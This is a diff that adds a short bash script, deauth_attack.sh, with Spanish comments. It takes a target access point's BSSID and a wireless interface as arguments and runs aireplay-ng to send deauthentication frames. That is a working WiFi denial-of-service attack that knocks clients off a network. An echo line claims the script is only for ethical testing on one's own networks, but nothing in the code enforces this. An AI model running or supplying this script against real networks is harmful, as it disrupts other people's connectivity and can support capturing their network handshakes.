@@ -1,0 +1,7 @@
+#!/bin/bash
+# Uso: ./deauth_attack.sh <BSSID> <INTERFACE>
+# Ejemplo: ./deauth_attack.sh AA:BB:CC:DD:EE:FF wlan0
+
+echo "[!] Este script es solo para pruebas éticas en redes propias!"
+echo "[*] Iniciando ataque Deauth a $1..."
+aireplay-ng --deauth 10 -a $1 $2
